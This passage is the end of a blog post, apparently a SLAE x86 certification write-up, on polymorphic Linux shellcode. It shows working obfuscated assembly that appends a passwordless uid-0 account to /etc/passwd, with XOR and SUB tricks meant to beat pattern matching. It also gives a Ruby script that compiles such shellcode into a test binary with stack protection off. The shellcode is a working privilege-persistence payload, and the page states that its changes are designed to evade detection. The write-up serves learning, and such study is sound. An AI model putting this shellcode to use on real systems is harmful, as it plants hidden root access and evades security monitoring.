  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=kt>dword</span> <span class=p>[</span><span class=nb>esp</span><span class=p>]</span>          <span class=c1>; ebx = &#39;sswd&#39;</span>
  <span class=nf>push</span> <span class=nb>ebx</span>                      <span class=c1>; esp value = &#39;sswd&#39;</span>
  <span class=nf>xor</span> <span class=kt>dword</span> <span class=p>[</span><span class=nb>esp</span><span class=p>],</span> <span class=mh>0x5075c5c</span>    <span class=c1>; esp value is now &#39;//pa&#39; after xor</span>
  <span class=nf>sub</span> <span class=nb>ebx</span><span class=p>,</span> <span class=mh>0x1030e44</span>            <span class=c1>; ebx = &#39;/etc&#39;</span>
  <span class=nf>push</span> <span class=nb>ebx</span>                      <span class=c1>; esp value = &#39;/etc&#39;</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>                  <span class=c1>; ebx = esp address</span>
  <span class=nf>inc</span> <span class=nb>cl</span>                        <span class=c1>; ecx = 0x1</span>
  <span class=nf>mov</span> <span class=nb>ch</span><span class=p>,</span> <span class=mh>0x4</span>                   <span class=c1>; ecx = (00000001 | 00002000) = 0x401</span>
                                <span class=c1>; source: /usr/include/asm-generic/fcntl.h</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                      <span class=c1>; syscall open(2)</span>

  <span class=c1>; write(fd, esp, size);</span>
  <span class=nf>xchg</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>eax</span>                 <span class=c1>; ebx = fd; eax = esp address</span>
  <span class=nf>xchg</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>ecx</span>                 <span class=c1>; ecx = esp address; eax = 0x401</span>
  <span class=nf>sub</span> <span class=nb>ax</span><span class=p>,</span> <span class=mh>0x3fd</span>                 <span class=c1>; eax = 0x4; write(2)</span>
  <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>                  <span class=c1>; clear edx</span>
  <span class=nf>push</span> <span class=nb>edx</span>                      <span class=c1>; push NULL</span>
  <span class=nf>mov</span> <span class=nb>edx</span><span class=p>,</span> <span class=mh>0x4c4e5f1f</span>           <span class=c1>; prepare edx for  &#39;0::/&#39;</span>
  <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=p>[</span><span class=nb>esp</span><span class=o>+</span><span class=mi>4</span><span class=p>]</span>              <span class=c1>; edx = &#39;0::/&#39;</span>
  <span class=nf>push</span> <span class=nb>edx</span>                      <span class=c1>; esp value  = &#39;0::/&#39;</span>
  <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=mh>0x5954495a</span>           <span class=c1>; edx = &#39;jsnv&#39;</span>
  <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>edx</span>                  <span class=c1>; ecx = &#39;jsnv&#39;</span>
  <span class=nf>sub</span> <span class=nb>edx</span><span class=p>,</span> <span class=mh>0x3c3e3930</span>           <span class=c1>; edx = &#39;::0:&#39;</span>
  <span class=nf>push</span> <span class=nb>edx</span>                      <span class=c1>; esp value = &#39;::0:&#39;</span>
  <span class=nf>push</span> <span class=nb>ecx</span>                      <span class=c1>; esp value = &#39;jsnv&#39;</span>
  <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>                  <span class=c1>; ecx = esp address</span>
  <span class=nf>push</span> <span class=kt>byte</span> <span class=mh>0xc</span>                 <span class=c1>; size = 12</span>
  <span class=nf>pop</span> <span class=nb>edx</span>                       <span class=c1>; edx = size</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                      <span class=c1>; syscall write(2)</span>

  <span class=c1>; close</span>
  <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x6</span>                   <span class=c1>; close(2)</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                      <span class=c1>; syscall close(2)</span>

  <span class=c1>; exit</span>
  <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>                 <span class=c1>; clear eax</span>
  <span class=nf>inc</span> <span class=nb>eax</span>                      <span class=c1>; eax = 0x1</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                     <span class=c1>; syscall _exit(2)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=shellcode-testing-2>Shellcode Testing</h3>
<p>Used the <a href=#ruby-script>Ruby script</a> to make the compilation of the binary easier.</p>
<p><img src=add_root_user.gif alt></p>
<h2 id=ruby-script>Ruby Script</h2>
<p>The following Ruby script is used for compiling the polymorphic version of the shellcodes:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=ch>#!/usr/bin/env ruby</span>
<span class=c1># Author: Jason Villaluna</span>

<span class=nb>require</span> <span class=s1>&#39;optparse&#39;</span>

<span class=k>def</span> <span class=nf>run</span>
  <span class=n>parse_args</span>
  <span class=n>compile_nasm</span><span class=p>(</span><span class=vi>@original</span><span class=p>)</span>
  <span class=n>compile_nasm</span><span class=p>(</span><span class=vi>@poly</span><span class=p>)</span>
  <span class=vi>@original_shellcode</span> <span class=o>=</span> <span class=n>generate_shellcode</span><span class=p>(</span><span class=vi>@original</span><span class=p>)</span>
  <span class=vi>@poly_shellcode</span> <span class=o>=</span> <span class=n>generate_shellcode</span><span class=p>(</span><span class=vi>@poly</span><span class=p>)</span>
  <span class=n>replace_shellcode</span>
  <span class=n>compile_binary</span>
  <span class=n>display_shellcode</span>
<span class=k>rescue</span> <span class=no>OptionParser</span><span class=o>::</span><span class=no>MissingArgument</span>
  <span class=nb>puts</span> <span class=s2>&#34;</span><span class=se>\e</span><span class=s2>[33mMissing argument:</span><span class=se>\e</span><span class=s2>[0m&#34;</span>
  <span class=vi>@parser</span><span class=o>.</span><span class=n>parse</span> <span class=sx>%w[--help]</span>
<span class=k>rescue</span> <span class=no>StandardError</span> <span class=o>=&gt;</span> <span class=n>e</span>
  <span class=nb>puts</span> <span class=s2>&#34;</span><span class=se>\e</span><span class=s2>[31m[-]</span><span class=se>\e</span><span class=s2>[0m Encountered: </span><span class=se>\e</span><span class=s2>[31m&#39;</span><span class=si>#{</span><span class=n>e</span><span class=o>.</span><span class=n>class</span><span class=si>}</span><span class=s2>&#39; </span><span class=si>#{</span><span class=n>e</span><span class=si>}</span><span class=se>\e</span><span class=s2>[0m&#34;</span>
  <span class=nb>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>end</span>

<span class=c1># Compile the nasm code</span>
<span class=k>def</span> <span class=nf>compile_nasm</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
  <span class=sb>`nasm -f elf32 -o </span><span class=si>#{</span><span class=n>filename</span><span class=si>}</span><span class=sb>.o </span><span class=si>#{</span><span class=n>filename</span><span class=si>}</span><span class=sb>.nasm`</span>
  <span class=sb>`ld -m elf_i386 -s -o </span><span class=si>#{</span><span class=n>filename</span><span class=si>}</span><span class=sb> </span><span class=si>#{</span><span class=n>filename</span><span class=si>}</span><span class=sb>.o`</span>
<span class=k>end</span>

<span class=c1># Generate shellcode using objdump</span>
<span class=k>def</span> <span class=nf>generate_shellcode</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
  <span class=n>objdump</span> <span class=o>=</span> <span class=sb>`objdump -d </span><span class=si>#{</span><span class=n>filename</span><span class=si>}</span><span class=sb>`</span>
  <span class=n>objdump</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>map</span> <span class=p>{</span> <span class=o>|</span><span class=n>line</span><span class=o>|</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>[</span><span class=mi>1</span><span class=o>]</span> <span class=p>}</span>
         <span class=o>.</span><span class=n>compact</span><span class=o>.</span><span class=n>map</span><span class=p>(</span><span class=o>&amp;</span><span class=ss>:split</span><span class=p>)</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s1>&#39;\x&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>prepend</span><span class=p>(</span><span class=s1>&#39;\x&#39;</span><span class=p>)</span>
<span class=k>end</span>

<span class=c1># Replace a value inside a file</span>
<span class=k>def</span> <span class=nf>replace_content</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
  <span class=n>file_content</span> <span class=o>=</span> <span class=no>File</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
  <span class=k>yield</span><span class=p>(</span><span class=n>file_content</span><span class=p>)</span>
  <span class=no>File</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>file_content</span><span class=p>)</span>
<span class=k>end</span>

<span class=c1># Replace shellcode in the shellcode tester program</span>
<span class=k>def</span> <span class=nf>replace_shellcode</span>
  <span class=n>replace_content</span><span class=p>(</span><span class=s1>&#39;./shellcode.c&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>c_code</span><span class=o>|</span>
    <span class=n>c_code</span><span class=o>.</span><span class=n>gsub!</span><span class=p>(</span><span class=sr>/\&#34;\S+\&#34;\;/</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\&#34;</span><span class=si>#{</span><span class=vi>@poly_shellcode</span><span class=si>}</span><span class=se>\&#34;</span><span class=s2>\;&#34;</span><span class=p>)</span>
  <span class=k>end</span>
<span class=k>end</span>

<span class=c1># Compile the shellcode into binary with the help of the shellcode.c program</span>
<span class=k>def</span> <span class=nf>compile_binary</span>
  <span class=sb>`gcc -fno-stack-protector -m32 -z execstack shellcode.c -o shellcode 2&gt; /dev/null`</span>
<span class=k>end</span>

<span class=c1># print the shellcode values</span>
<span class=k>def</span> <span class=nf>display_shellcode</span>
  <span class=n>original_size</span> <span class=o>=</span> <span class=vi>@original_shellcode</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;\\&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>size</span> <span class=o>-</span> <span class=mi>1</span>
  <span class=n>poly_size</span> <span class=o>=</span> <span class=vi>@poly_shellcode</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;\\&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>size</span> <span class=o>-</span> <span class=mi>1</span>
  <span class=n>percentage</span> <span class=o>=</span> <span class=p>((</span><span class=mi>100</span><span class=o>.</span><span class=mi>0</span> <span class=o>*</span> <span class=n>poly_size</span> <span class=o>/</span> <span class=n>original_size</span><span class=p>)</span> <span class=o>-</span> <span class=mi>100</span><span class=p>)</span><span class=o>.</span><span class=n>round</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
  <span class=nb>puts</span> <span class=s2>&#34;Original shellcode    [</span><span class=si>#{</span><span class=n>original_size</span><span class=si>}</span><span class=s2> bytes]: &#39;</span><span class=si>#{</span><span class=vi>@original_shellcode</span><span class=si>}</span><span class=s2>&#39;&#34;</span>
  <span class=nb>puts</span> <span class=s2>&#34;Polymorphic shellcode [</span><span class=si>#{</span><span class=n>poly_size</span><span class=si>}</span><span class=s2> bytes]: &#39;</span><span class=si>#{</span><span class=vi>@poly_shellcode</span><span class=si>}</span><span class=s2>&#39;&#34;</span>
  <span class=nb>puts</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Percentage larger than the original: </span><span class=si>#{</span><span class=n>percentage</span><span class=si>}</span><span class=s2> %&#34;</span>
<span class=k>end</span>

<span class=k>def</span> <span class=nf>parse_args</span>
  <span class=vi>@parser</span> <span class=o>=</span> <span class=no>OptionParser</span><span class=o>.</span><span class=n>new</span> <span class=k>do</span> <span class=o>|</span><span class=n>opts</span><span class=o>|</span>
    <span class=n>opts</span><span class=o>.</span><span class=n>banner</span> <span class=o>=</span> <span class=s2>&#34;Usage: </span><span class=si>#{</span><span class=vg>$0</span><span class=si>}</span><span class=s2> [options]&#34;</span>
    <span class=n>opts</span><span class=o>.</span><span class=n>separator</span> <span class=s2>&#34;&#34;</span>
    <span class=n>opts</span><span class=o>.</span><span class=n>separator</span> <span class=s2>&#34;Options:&#34;</span>

    <span class=n>opts</span><span class=o>.</span><span class=n>on</span><span class=p>(</span><span class=s2>&#34;--original&#34;</span><span class=p>,</span> <span class=s2>&#34;-o ORIG_NASM&#34;</span><span class=p>,</span> <span class=s2>&#34;Original nasm filename&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>value</span><span class=o>|</span>
      <span class=vi>@original</span> <span class=o>=</span> <span class=n>value</span>
    <span class=k>end</span>

    <span class=n>opts</span><span class=o>.</span><span class=n>on</span><span class=p>(</span><span class=s2>&#34;--poly&#34;</span><span class=p>,</span> <span class=s2>&#34;-p POLY_NASM&#34;</span><span class=p>,</span> <span class=s2>&#34;Polymorphic nasm filename&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>value</span><span class=o>|</span>
      <span class=vi>@poly</span> <span class=o>=</span> <span class=n>value</span>
    <span class=k>end</span>

    <span class=n>opts</span><span class=o>.</span><span class=n>on_tail</span><span class=p>(</span><span class=s2>&#34;--help&#34;</span><span class=p>,</span> <span class=s2>&#34;-h&#34;</span><span class=p>,</span> <span class=s2>&#34;Print options&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>show_help</span><span class=o>|</span>
      <span class=nb>warn</span> <span class=n>opts</span>
      <span class=nb>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=k>end</span>
  <span class=k>end</span>
  <span class=vi>@parser</span><span class=o>.</span><span class=n>parse!</span>
<span class=k>end</span>

<span class=k>if</span> <span class=bp>__FILE__</span> <span class=o>==</span> <span class=vg>$PROGRAM_NAME</span>
  <span class=n>run</span>
  <span class=nb>puts</span> <span class=s2>&#34;</span><span class=se>\n\e</span><span class=s2>[32m[+]</span><span class=se>\e</span><span class=s2>[0m Successfully generated </span><span class=se>\e</span><span class=s2>[32mshellcode</span><span class=se>\e</span><span class=s2>[0m &#34;</span><span class=p>\</span>
       <span class=s2>&#34;binary for testing!&#34;</span>
<span class=k>end</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=script-usage>Script Usage</h3>
<p><img src=Pasted%20image%2020211023130316.png alt></p>
<hr>
<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href=http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
<p>Student ID: SLAE - 1558</p>
<hr>
<p><a href=https://github.com/jsnv-dev/slae_x86_assignments/tree/main/A6><code>Link to Github repository</code></a> | <a href=../slae_x86><code>Link to index page</code></a></p>
</div>
</article>
<div id=footer-post-container>
<div id=footer-post>
<div id=nav-footer style=display:none>
<ul>
<li><a href=/>~/</a></li>
<li><a href=/posts>~/posts</a></li>
<li><a href=/tags>~/tags</a></li>
<li><a href=/about>~/about</a></li>
<li><a href=/work>~/work</a></li>
</ul>
</div>
<div id=toc-footer style=display:none>
<nav id=TableOfContents>
<ul>
<li><a href=#objectives>Objectives</a></li>
<li><a href=#polymorphism>Polymorphism</a></li>
<li><a href=#tiny-execve-sh-shellcode>Tiny Execve sh Shellcode</a>
<ul>
<li><a href=#original-shellcode>Original Shellcode</a></li>
<li><a href=#polymorphic-version>Polymorphic Version</a></li>
<li><a href=#shellcode-testing>Shellcode Testing</a></li>
</ul>
</li>
<li><a href=#tiny-read-file-shellcode>Tiny Read File Shellcode</a>
<ul>
<li><a href=#original-shellcode-1>Original Shellcode</a></li>
<li><a href=#polymorphic-version-1>Polymorphic Version</a></li>
<li><a href=#shellcode-testing-1>Shellcode Testing</a></li>
</ul>
</li>
<li><a href=#add-root-user-shellcode>Add Root User Shellcode</a>
<ul>
<li><a href=#original-shellcode-2>Original Shellcode</a></li>
<li><a href=#polymorphic-version-2>Polymorphic Version</a></li>
<li><a href=#shellcode-testing-2>Shellcode Testing</a></li>
</ul>
</li>
<li><a href=#ruby-script>Ruby Script</a>
<ul>
<li><a href=#script-usage>Script Usage</a></li>
</ul>
</li>
</ul>
</nav>
</div>
<div id=share-footer style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f" aria-label=Facebook>
<i class="fab fa-facebook fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&text=SLAE%20x86%20-%20Assignment%200x6" aria-label=Twitter>
<i class="fab fa-twitter fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&title=SLAE%20x86%20-%20Assignment%200x6" aria-label=Linkedin>
<i class="fab fa-linkedin fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&is_video=false&description=SLAE%20x86%20-%20Assignment%200x6" aria-label=Pinterest>
<i class="fab fa-pinterest fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=SLAE%20x86%20-%20Assignment%200x6&body=Check out this article: https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f" aria-label=Email>
<i class="fas fa-envelope fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&title=SLAE%20x86%20-%20Assignment%200x6" aria-label=Pocket>
<i class="fab fa-get-pocket fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&title=SLAE%20x86%20-%20Assignment%200x6" aria-label=reddit>
<i class="fab fa-reddit fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&name=SLAE%20x86%20-%20Assignment%200x6&description=Shellcode%20Polymorphism%20Objectives%20%20Take%20up%203%20shellcodes%20from%20shell-storm%20and%20create%20polymorphic%20versions%20of%20them%20to%20beat%20pattern%20matching%20%20The%20polymorphic%20versions%20cannot%20be%20larger%20150%25%20of%20the%20existing%20shellcode%20Bonus%20points%20for%20making%20it%20shorter%20in%20length%20than%20original%20%20%20%20Polymorphism%20It%20is%20a%20%26ldquo%3bconcept%20borrowed%20from%20a%20principle%20in%20biology%20where%20an%20organism%20or%20species%20can%20have%20many%20different%20forms%20or%20stages%26rdquo%3b%20as%20mentioned%20in%20this%20Wikipedia%20Article." aria-label=Tumblr>
<i class="fab fa-tumblr fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&t=SLAE%20x86%20-%20Assignment%200x6" aria-label="Hacker News">
<i class="fab fa-hacker-news fa-lg" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=actions-footer>
<a id=menu-toggle class=icon href=# onclick="return $('#nav-footer').toggle(),!1" aria-label=Menu>
<i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick="return $('#toc-footer').toggle(),!1" aria-label=TOC>
<i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick="return $('#share-footer').toggle(),!1" aria-label=Share>
<i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a>
</div>
</div>
</div>
<footer id=footer>
<div class=footer-left>
Copyright &copy; 2021 jsn>
<a class=icon target=_blank rel=noopener href=https://github.com/jsnv-dev aria-label=github>
<i class="fab fa-github" aria-hidden=true></i>
</a>
<a class=icon target=_blank rel=noopener href=https://www.linkedin.com/in/jasonvillaluna aria-label=linkedin>
<i class="fab fa-linkedin" aria-hidden=true></i>
</a>
</div>
<div class=footer-right>
<nav>
<ul>
<li><a href=/>~/</a></li>
<li><a href=/posts>~/posts</a></li>
<li><a href=/tags>~/tags</a></li>
<li><a href=/about>~/about</a></li>
<li><a href=/work>~/work</a></li>
</ul>
</nav>
</div>
</footer>
</div>
</body>
<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>
<script src=/js/code-copy.js></script>
</html>